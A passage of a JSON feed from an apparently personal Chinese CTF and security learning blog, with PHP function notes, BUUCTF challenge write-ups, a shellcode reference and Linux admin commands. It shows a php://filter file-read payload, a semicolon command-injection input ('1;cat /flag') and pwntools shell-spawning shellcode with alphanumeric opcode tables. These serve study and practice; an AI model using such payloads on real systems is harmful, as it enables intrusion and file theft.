            "content_html": "<h1 id=\"函数\"><a class=\"markdownIt-Anchor\" href=\"#函数\">#</a> 函数</h1>\n<h2 id=\"mb_substr\"><a class=\"markdownIt-Anchor\" href=\"#mb_substr\">#</a> mb_substr</h2>\n<p>截取函数</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$start</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$length</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$encoding</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$str</span>，需要截断的字符串</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$start</span>，截断开始处，起始处为<span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$length</span>，要截取的字数</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$encoding</span>，网页编码，如utf<span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token constant\">GB2312</span><span class=\"token punctuation\">,</span><span class=\"token constant\">GBK</span></pre></td></tr></table></figure><h2 id=\"mb_strpos\"><a class=\"markdownIt-Anchor\" href=\"#mb_strpos\">#</a> mb_strpos</h2>\n<p>查找字符</p>\n<p>返回匹配的字符第一次出现的位置。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span>\t$查找<span class=\"token operator\">?</span>在page第一次出现的位置</pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/11/buu-1120/",
            "url": "http://waltcsz.github.io/2023/11/buu-1120/",
            "title": "buu_1120",
            "date_published": "2023-11-19T16:36:42.000Z",
            "content_html": "<h2 id=\"极客大挑战-2019easysql\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019easysql\">#</a> [极客大挑战 2019] EasySQL</h2>\n<p>** 考点：**sql 万能密码</p>\n<p>用户名输入万能账户，使得 sql 检测语句通过。</p>\n<p><img data-src=\"./image-20231120003749481.png\" alt=\"image-20231120003749481\"></p>\n<h2 id=\"极客大挑战-2019easysql-2\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019easysql-2\">#</a> [极客大挑战 2019] EasySQL</h2>\n<p>** 考点：**http 参数传递</p>\n<p>看注释，利用 get 传参，让 cat 变量值为’dog’。</p>\n<p><img data-src=\"./image-20231120004356307.png\" alt=\"image-20231120004356307\"></p>\n<h1 id=\"actf2020-新生赛include\"><a class=\"markdownIt-Anchor\" href=\"#actf2020-新生赛include\">#</a> [ACTF2020 新生赛] Include</h1>\n<p>用 php 过滤器将 flag.php 加密，然后解密。</p>\n<p>flag 存放在文件中，但是注释掉了，用 base64 加密后输出的字符就不会包含注释符了。</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?file=php://filter/read=convert.base64-encode/resource=flag.php</pre></td></tr></table></figure><p 3111eabf-5dff-4242-b2b3-30bb33d57ffd=\"\">flag</p>\n<h1 id=\"actf2020-新生赛exec\"><a class=\"markdownIt-Anchor\" href=\"#actf2020-新生赛exec\">#</a> [ACTF2020 新生赛] Exec</h1>\n<p>远程执行命令</p>\n<p>用分号分隔开 ping 命令，然后就可以输入任意 linux 命令。</p>\n<p>输入</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token function\">cat</span> /flag</pre></td></tr></table></figure><p>直接获得 flag</p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/11/shellcode/",
            "url": "http://waltcsz.github.io/2023/11/shellcode/",
            "title": "shellcode",
            "date_published": "2023-11-19T07:43:55.000Z",
            "content_html": "<p>当题目执行流程会跳转到可读写执行的地址时，我们就需要构造合适的 shellcode 来实现我们的目的。</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>“/bin”-&gt;rdi</th>\n<th>“/sh\\0”</th>\n<th>syscall 机器码</th>\n<th>execve 调用号 - rax</th>\n<th>rsi</th>\n<th>rdx</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>编码</td>\n<td>\\x2f\\x62\\x69\\x6e</td>\n<td>\\x2f\\x7c\\x68\\x00</td>\n<td>\\x0f\\x05</td>\n<td>\\x3b</td>\n<td>0</td>\n<td>0</td>\n</tr>\n<tr>\n<td>16 进制</td>\n<td>0x6e69622f</td>\n<td>0x68732f</td>\n<td>0x50f</td>\n<td>0x3b</td>\n<td>0</td>\n<td>0</td>\n</tr>\n<tr>\n<td>xor</td>\n<td>31 30 30 36</td>\n<td>31 30 30 5a</td>\n<td>41 30</td>\n<td>39</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>xor</td>\n<td>48 52 59 58</td>\n<td>48 53 58 5a</td>\n<td>4e 35</td>\n<td>32</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>41</td>\n<td>41</td>\n<td></td>\n<td>30</td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"无字符输入限制\"><a class=\"markdownIt-Anchor\" href=\"#无字符输入限制\">#</a> 无字符输入限制</h1>\n<h2 id=\"无沙盒\"><a class=\"markdownIt-Anchor\" href=\"#无沙盒\">#</a> 无沙盒</h2>\n<h3 id=\"工具构造\"><a class=\"markdownIt-Anchor\" href=\"#工具构造\">#</a> 工具构造</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>context<span class=\"token punctuation\">.</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span>\t<span class=\"token comment\"># in 64-bit</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>手工构造</p>\n<h2 id=\"有沙盒\"><a class=\"markdownIt-Anchor\" href=\"#有沙盒\">#</a> 有沙盒</h2>\n<h1 id=\"有字符输入限制\"><a class=\"markdownIt-Anchor\" href=\"#有字符输入限制\">#</a> 有字符输入限制</h1>\n<p>alphanumeric shellcode</p>\n<h2 id=\"x64\"><a class=\"markdownIt-Anchor\" href=\"#x64\">#</a> x64</h2>\n<p>Numeric</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">ASCII</th>\n<th style=\"text-align:center\">Hex</th>\n<th style=\"text-align:center\">Assembler Instruction</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">0</td>\n<td style=\"text-align:center\">0x30</td>\n<td style=\"text-align:center\">xor %{16bit}, (%{64bit})</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">0x31</td>\n<td style=\"text-align:center\">xor %{32bit}, (%{64bit})</td>\n</tr>\n<tr 16bit=\"\">\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:center\">0x32</td>\n<td style=\"text-align:center\">xor (%{64bit}), %</td>\n</tr>\n<tr 32bit=\"\">\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:center\">0x33</td>\n<td style=\"text-align:center\">xor (%{64bit}), %</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">4</td>\n<td style=\"text-align:center\">0x34</td>\n<td style=\"text-align:center\">xor [byte], %al</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">5</td>\n<td style=\"text-align:center\">0x35</td>\n<td style=\"text-align:center\">xor [dword], %eax</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">6</td>\n<td style=\"text-align:center\">0x36</td>\n<td style=\"text-align:center\">%ss segment register</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">7</td>\n<td style=\"text-align:center\">0x37</td>\n<td style=\"text-align:center\">Bad Instruction!</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">8</td>\n<td style=\"text-align:center\">0x38</td>\n<td style=\"text-align:center\">cmp %{16bit}, (%{64bit})</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">9</td>\n<td style=\"text-align:center\">0x39</td>\n<td style=\"text-align:center\">cmp %{32bit}, (%{64bit})</td>\n</tr>\n</tbody>\n</table>\n<p>Uppercase</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">ASCII</th>\n<th style=\"text-align:center\">Hex</th>\n<th style=\"text-align:center\">Assembler Instruction</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">A</td>\n<td style=\"text-align:center\">0x41</td>\n<td style=\"text-align:center\">64 bit reserved prefix</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">B</td>\n<td style=\"text-align:center\">0x42</td>\n<td style=\"text-align:center\">64 bit reserved prefix</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">C</td>\n<td style=\"text-align:center\">0x43</td>\n<td style=\"text-align:center\">64 bit reserved prefix</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">D</td>\n<td style=\"text-align:center\">0x44</td>\n<td style=\"text-align:center\">64 bit reserved prefix</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">E</td>\n<td style=\"text-align:center\">0x45</td>\n<td style=\"text-align:center\">64 bit reserved prefix</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">F</td>\n<td style=\"text-align:center\">0x46</td>\n<td style=\"text-align:center\">64 bit reserved prefix</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">G</td>\n<td style=\"text-align:center\">0x47</td>\n<td style=\"text-align:center\">64 bit reserved prefix</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">H</td>\n<td style=\"text-align:center\">0x48</td>\n<td style=\"text-align:center\">64 bit reserved prefix</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">I</td>\n<td style=\"text-align:center\">0x49</td>\n<td style=\"text-align:center\">64 bit reserved prefix</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">J</td>\n<td style=\"text-align:center\">0x4a</td>\n<td style=\"text-align:center\">64 bit reserved prefix</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">K</td>\n<td style=\"text-align:center\">0x4b</td>\n<td style=\"text-align:center\">64 bit reserved prefix</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">L</td>\n<td style=\"text-align:center\">0x4c</td>\n<td style=\"text-align:center\">64 bit reserved prefix</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">M</td>\n<td style=\"text-align:center\">0x4d</td>\n<td style=\"text-align:center\">64 bit reserved prefix</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">N</td>\n<td style=\"text-align:center\">0x4e</td>\n<td style=\"text-align:center\">64 bit reserved prefix</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">O</td>\n<td style=\"text-align:center\">0x4f</td>\n<td style=\"text-align:center\">64 bit reserved prefix</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">P</td>\n<td style=\"text-align:center\">0x50</td>\n<td style=\"text-align:center\">push %rax</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Q</td>\n<td style=\"text-align:center\">0x51</td>\n<td style=\"text-align:center\">push %rcx</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">R</td>\n<td style=\"text-align:center\">0x52</td>\n<td style=\"text-align:center\">push %rdx</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">S</td>\n<td style=\"text-align:center\">0x53</td>\n<td style=\"text-align:center\">push %rbx</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">T</td>\n<td style=\"text-align:center\">0x54</td>\n<td style=\"text-align:center\">push %rsp</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">U</td>\n<td style=\"text-align:center\">0x55</td>\n<td style=\"text-align:center\">push %rbp</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">V</td>\n<td style=\"text-align:center\">0x56</td>\n<td style=\"text-align:center\">push %rsi</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">W</td>\n<td style=\"text-align:center\">0x57</td>\n<td style=\"text-align:center\">push %rdi</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">X</td>\n<td style=\"text-align:center\">0x58</td>\n<td style=\"text-align:center\">pop %rax</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Y</td>\n<td style=\"text-align:center\">0x59</td>\n<td style=\"text-align:center\">pop %rcx</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Z</td>\n<td style=\"text-align:center\">0x5a</td>\n<td style=\"text-align:center\">pop %rdx</td>\n</tr>\n</tbody>\n</table>\n<p>Lowercase</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">ASCII</th>\n<th style=\"text-align:center\">Hex</th>\n<th style=\"text-align:center\">Assembler Instruction</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">a</td>\n<td style=\"text-align:center\">0x61</td>\n<td style=\"text-align:center\">Bad Instruction!</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">b</td>\n<td style=\"text-align:center\">0x62</td>\n<td style=\"text-align:center\">Bad Instruction!</td>\n</tr>\n<tr 32bit=\"\">\n<td style=\"text-align:center\">c</td>\n<td style=\"text-align:center\">0x63</td>\n<td style=\"text-align:center\">movslq (%{64bit}), %</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">d</td>\n<td style=\"text-align:center\">0x64</td>\n<td style=\"text-align:center\">%fs segment register</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">e</td>\n<td style=\"text-align:center\">0x65</td>\n<td style=\"text-align:center\">%gs segment register</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">f</td>\n<td style=\"text-align:center\">0x66</td>\n<td style=\"text-align:center\">16 bit operand override</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">g</td>\n<td style=\"text-align:center\">0x67</td>\n<td style=\"text-align:center\">16 bit ptr override</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">h</td>\n<td style=\"text-align:center\">0x68</td>\n<td style=\"text-align:center\">push [dword]</td>\n</tr>\n<tr 32bit=\"\">\n<td style=\"text-align:center\">i</td>\n<td style=\"text-align:center\">0x69</td>\n<td style=\"text-align:center\">imul [dword], (%{64bit}), %</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">j</td>\n<td style=\"text-align:center\">0x6a</td>\n<td style=\"text-align:center\">push [byte]</td>\n</tr>\n<tr 32bit=\"\">\n<td style=\"text-align:center\">k</td>\n<td style=\"text-align:center\">0x6b</td>\n<td style=\"text-align:center\">imul [byte], (%{64bit}), %</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">l</td>\n<td style=\"text-align:center\">0x6c</td>\n<td style=\"text-align:center\">insb (%dx),%es:(%rdi)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">m</td>\n<td style=\"text-align:center\">0x6d</td>\n<td style=\"text-align:center\">insl (%dx),%es:(%rdi)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">n</td>\n<td style=\"text-align:center\">0x6e</td>\n<td style=\"text-align:center\">outsb %ds:(%rsi),(%dx)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">o</td>\n<td style=\"text-align:center\">0x6f</td>\n<td style=\"text-align:center\">outsl %ds:(%rsi),(%dx)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">p</td>\n<td style=\"text-align:center\">0x70</td>\n<td style=\"text-align:center\">jo [byte]</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">q</td>\n<td style=\"text-align:center\">0x71</td>\n<td style=\"text-align:center\">jno [byte]</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">r</td>\n<td style=\"text-align:center\">0x72</td>\n<td style=\"text-align:center\">jb [byte]</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">s</td>\n<td style=\"text-align:center\">0x73</td>\n<td style=\"text-align:center\">jae [byte]</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">t</td>\n<td style=\"text-align:center\">0x74</td>\n<td style=\"text-align:center\">je [byte]</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">u</td>\n<td style=\"text-align:center\">0x75</td>\n<td style=\"text-align:center\">jne [byte]</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">v</td>\n<td style=\"text-align:center\">0x76</td>\n<td style=\"text-align:center\">jbe [byte]</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">w</td>\n<td style=\"text-align:center\">0x77</td>\n<td style=\"text-align:center\">ja [byte]</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">x</td>\n<td style=\"text-align:center\">0x78</td>\n<td style=\"text-align:center\">js [byte]</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">0x79</td>\n<td style=\"text-align:center\">jns [byte]</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">z</td>\n<td style=\"text-align:center\">0x7a</td>\n<td style=\"text-align:center\">jp [byte]</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"push-alphanumeric-x86_64-data\"><a class=\"markdownIt-Anchor\" href=\"#push-alphanumeric-x86_64-data\">#</a> Push: Alphanumeric x86_64 data</h3>\n<table>\n<thead>\n<tr>\n<th>Assembly</th>\n<th>Hexadecimal</th>\n<th>Alphanumeric ASCII</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>pushw [word]</td>\n<td>\\x66\\x68\\x##\\x##</td>\n<td>fh??</td>\n</tr>\n<tr>\n<td>pushq [byte]</td>\n<td>\\x6a\\x##</td>\n<td>j?</td>\n</tr>\n<tr>\n<td>pushq [dword]</td>\n<td>\\x68\\x##\\x##\\x##\\x##</td>\n<td>h???</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"push-x86_64-16-bit-registers\"><a class=\"markdownIt-Anchor\" href=\"#push-x86_64-16-bit-registers\">#</a> Push: x86_64 16 bit Registers</h3>\n<table>\n<thead>\n<tr>\n<th>Assembly</th>\n<th>Hexadecimal</th>\n<th>Alphanumeric ASCII</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>push %ax</td>\n<td>\\x66\\x50</td>\n<td>fP</td>\n</tr>\n<tr>\n<td>push %cx</td>\n<td>\\x66\\x51</td>\n<td>fQ</td>\n</tr>\n<tr>\n<td>push %dx</td>\n<td>\\x66\\x52</td>\n<td>fR</td>\n</tr>\n<tr>\n<td>push %bx</td>\n<td>\\x66\\x53</td>\n<td>fS</td>\n</tr>\n<tr>\n<td>push %sp</td>\n<td>\\x66\\x54</td>\n<td>fT</td>\n</tr>\n<tr>\n<td>push %bp</td>\n<td>\\x66\\x55</td>\n<td>fU</td>\n</tr>\n<tr>\n<td>push %si</td>\n<td>\\x66\\x56</td>\n<td>fV</td>\n</tr>\n<tr>\n<td>push %di</td>\n<td>\\x66\\x57</td>\n<td>fW</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"pop-x86_64-extended-registers\"><a class=\"markdownIt-Anchor\" href=\"#pop-x86_64-extended-registers\">#</a> Pop: x86_64 Extended Registers</h3>\n<table>\n<thead>\n<tr>\n<th>Assembly</th>\n<th>Hexadecimal</th>\n<th>Alphanumeric ASCII</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>pop %rax</td>\n<td>\\x58</td>\n<td>X</td>\n</tr>\n<tr>\n<td>pop %rcx</td>\n<td>\\x59</td>\n<td>Y</td>\n</tr>\n<tr>\n<td>pop %rax</td>\n<td>\\x5a</td>\n<td>Z</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"x86_64-16-bit-registers\"><a class=\"markdownIt-Anchor\" href=\"#x86_64-16-bit-registers\">#</a> x86_64 16 bit registers</h3>\n<table>\n<thead>\n<tr>\n<th>Assembly</th>\n<th>Hexadecimal</th>\n<th>Alphanumeric ASCII</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>pop %ax</td>\n<td>\\x66\\x58</td>\n<td>fX</td>\n</tr>\n<tr>\n<td>pop %cx</td>\n<td>\\x66\\x59</td>\n<td>fY</td>\n</tr>\n<tr>\n<td>pop %dx</td>\n<td>\\x66\\x5a</td>\n<td>fZ</td>\n</tr>\n<tr>\n<td>pop *%r8w</td>\n<td>\\x66\\x41\\x58</td>\n<td>fAX</td>\n</tr>\n<tr>\n<td>pop *%r9w</td>\n<td>\\x66\\x41\\x59</td>\n<td>fAY</td>\n</tr>\n<tr>\n<td>pop *%r10w</td>\n<td>\\x66\\x41\\x5a</td>\n<td>fAZ</td>\n</tr>\n</tbody>\n</table>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9uZXRzLmVjL1NoZWxsY29kZS9BcHBlbmRpeC9BbHBoYW51bWVyaWNfb3Bjb2Rl\">Alphanumeric opcode</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NtYWxPU25haWwvYXJ0aWNsZS9kZXRhaWxzLzEwNTIzNjMzNg==\"> 这是那篇怎么搜都出现两三遍的文章</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9uZXRzLmVjL0FscGhhbnVtZXJpY19zaGVsbGNvZGU=\"> https://nets.ec/Alphanumeric_shellcode</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODU4NzE=\">https://www.anquanke.com/post/id/85871</span></p>\n",
            "tags": [
                "shellcode"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/11/linuxcommand/",
            "url": "http://waltcsz.github.io/2023/11/linuxcommand/",
            "title": "linuxCommand",
            "date_published": "2023-11-18T11:57:00.000Z",
            "content_html": "<h1 id=\"用户\"><a class=\"markdownIt-Anchor\" href=\"#用户\">#</a> 用户</h1>\n<h2 id=\"用户组\"><a class=\"markdownIt-Anchor\" href=\"#用户组\">#</a> 用户组</h2>\n<p>管理员组</p>\n<table>\n<thead>\n<tr>\n<th>系统</th>\n<th>管理员组</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>CentOS</td>\n<td>wheel</td>\n</tr>\n<tr>\n<td>ubuntu</td>\n<td></td>\n</tr>\n<tr>\n<td>rhel</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"操作\"><a class=\"markdownIt-Anchor\" href=\"#操作\">#</a> 操作</h2>\n<h3 id=\"获取用户列表\"><a class=\"markdownIt-Anchor\" href=\"#获取用户列表\">#</a> 获取用户列表</h3>\n<p><code>cat /etc/passwd</code>  以以下格式显示用户数据</p>\n<pre><code>用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell\n</code></pre>\n<h4 id=\"添加用户\"><a class=\"markdownIt-Anchor\" href=\"#添加用户\">#</a> 添加用户</h4>\n<p>useradd</p>\n<p>参数</p>\n<p>adduser</p>\n<p>参数</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>实例</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-m</td>\n<td></td>\n<td>创建用户的登陆目录</td>\n</tr>\n<tr>\n<td>-s</td>\n<td>-s /sbin/nologin</td>\n<td>指定用户登陆后使用的 shell</td>\n</tr>\n<tr>\n<td>-g</td>\n<td></td>\n<td>指定用户所属群组</td>\n</tr>\n<tr>\n<td>-G</td>\n<td>-G wheel</td>\n<td>指定用户所属附属群组</td>\n</tr>\n<tr>\n<td>-u</td>\n<td></td>\n<td>指定 uid</td>\n</tr>\n<tr>\n<td>-c</td>\n<td>-c ‘use for game’</td>\n<td>添加备注</td>\n</tr>\n</tbody>\n</table>\n<p>centos</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">useradd</span> <span class=\"token parameter variable\">-m</span> <span class=\"token parameter variable\">-s</span> /bin/bash <span class=\"token parameter variable\">-G</span> wheel user1</pre></td></tr></table></figure><h4 id=\"删除用户\"><a class=\"markdownIt-Anchor\" href=\"#删除用户\">#</a> 删除用户</h4>\n<p>userdel</p>\n<p>-r 清除用户目录和邮箱</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">userdel</span> <span class=\"token parameter variable\">-r</span> user1+</pre></td></tr></table></figure><h2 id=\"密码\"><a class=\"markdownIt-Anchor\" href=\"#密码\">#</a> 密码</h2>\n<p>使用 passwd 命令管理密码。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">passwd</span> <span class=\"token parameter variable\">-l</span> user1\t<span class=\"token comment\"># 禁止密码登陆</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">passwd</span> <span class=\"token parameter variable\">-d</span> user1\t<span class=\"token comment\"># 清除密码免密登陆</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">passwd</span> user1\t<span class=\"token comment\"># 修改指定用户密码</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">passwd</span>\t\t\t<span class=\"token comment\"># 修改当前用户密码</span></pre></td></tr></table></figure><h2 id=\"登陆\"><a class=\"markdownIt-Anchor\" href=\"#登陆\">#</a> 登陆</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EyODE0Njg2NzMvYXJ0aWNsZS9kZXRhaWxzLzkwNzY1NDYz\">Linux 设置 root 密钥登录，普通用户密码登录</span></p>\n<h1 id=\"软件安装\"><a class=\"markdownIt-Anchor\" href=\"#软件安装\">#</a> 软件安装</h1>\n<h2 id=\"centos\"><a class=\"markdownIt-Anchor\" href=\"#centos\">#</a> CentOS</h2>\n<h3 id=\"yum\"><a class=\"markdownIt-Anchor\" href=\"#yum\">#</a> yum</h3>\n<h4 id=\"yum源配置\"><a class=\"markdownIt-Anchor\" href=\"#yum源配置\">#</a> yum 源配置</h4>\n<p>配置文件位于 <code>/etc/yum.repos.d</code>  目录。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>curl <span class=\"token operator\">-</span>o <span class=\"token operator\">/</span>etc<span class=\"token operator\">/</span>yum<span class=\"token punctuation\">.</span>repos<span class=\"token punctuation\">.</span>d<span class=\"token operator\">/</span>CentOS<span class=\"token operator\">-</span>Base<span class=\"token punctuation\">.</span>repo http<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span>mirrors<span class=\"token punctuation\">.</span>aliyun<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span>repo<span class=\"token operator\">/</span>Centos<span class=\"token operator\">-</span><span class=\"token number\">7</span><span class=\"token punctuation\">.</span>repo <span class=\"token comment\"># 获取阿里的 repo</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>yum clean <span class=\"token builtin\">all</span>\t<span class=\"token comment\"># 清除缓存</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>yum makecache\t<span class=\"token comment\"># 生成新缓存</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>yum install <span class=\"token operator\">-</span>y epel<span class=\"token operator\">-</span>release <span class=\"token comment\"># epel 源</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>yum clean <span class=\"token builtin\">all</span>\t<span class=\"token comment\"># 清除缓存</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>yum makecache\t<span class=\"token comment\"># 生成新缓存</span></pre></td></tr></table></figure><h3 id=\"rpm\"><a class=\"markdownIt-Anchor\" href=\"#rpm\">#</a> rpm</h3>\n<h4 id=\"安装\"><a class=\"markdownIt-Anchor\" href=\"#安装\">#</a> 安装</h4>\n<pre><code>rpm -i 文件\n</code></pre>\n<p>参数</p>\n<ul>\n<li>-i 指定包名</li>\n<li>-v 显示安装信息</li>\n<li>-h 显示安装进度</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">rpm</span> <span class=\"token parameter variable\">-ivh</span> example.rpm</pre></td></tr></table></figure><h4 id=\"查询\"><a class=\"markdownIt-Anchor\" href=\"#查询\">#</a> 查询</h4>\n<pre><code>rpm -q .\n</code></pre>\n<h4 id=\"卸载\"><a class=\"markdownIt-Anchor\" href=\"#卸载\">#</a> 卸载</h4>\n<pre><code>rpm -e\n</code></pre>\n<h1 id=\"其他命令\"><a class=\"markdownIt-Anchor\" href=\"#其他命令\">#</a> 其他命令</h1>\n<p>结束进程</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">kill</span> <span class=\"token punctuation\">[</span>参数<span class=\"token punctuation\">]</span> 进程号</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">killall</span> <span class=\"token punctuation\">[</span>参数<span class=\"token punctuation\">]</span> 进程名称</pre></td></tr></table></figure><ul>\n<li>-8 强制结束</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">kill</span> <span class=\"token parameter 